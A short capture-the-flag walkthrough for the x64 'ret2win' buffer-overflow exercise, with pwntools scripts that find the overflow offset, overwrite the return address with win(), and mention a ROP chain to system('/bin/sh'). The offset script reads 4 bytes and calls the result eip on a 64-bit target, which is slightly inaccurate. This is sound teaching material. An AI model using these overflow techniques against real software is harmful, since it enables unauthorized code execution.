# CTF: ret2win Walkthrough

A minimal x64 buffer overflow to warm up your ROP brain.

## TL;DR

- Leak offset with `pattern` or `cyclic`
- Overwrite return address with `win()` or ROP chain
- Enjoy the flag

## Setup

```bash
file ret2win
checksec --file ret2win
```

Expect `NX enabled, PIE disabled` for a classic.

## Find the offset

```bash
python3 - <<'PY'
from pwn import *
context.binary = ELF('./ret2win')
# Build a pattern or use cyclic
payload = cyclic(200)
p = process()
p.sendlineafter(b'> ', payload)
p.wait()
eip = cyclic_find(p.corefile.read(p.corefile.sp, 4))
print('offset =', eip)
PY
```

## Exploit

```python
from pwn import *
context.binary = e = ELF('./ret2win')
# Assume offset discovered above
offset = 40
payload = b'A'*offset + p64(e.symbols['win'])
io = process()
io.sendlineafter(b'> ', payload)
io.interactive()
```

If no `win()`, build a small ROP to `system('/bin/sh')`.

> Always run your exploit under `tmux` and keep `ulimit -c unlimited` for core dumps.
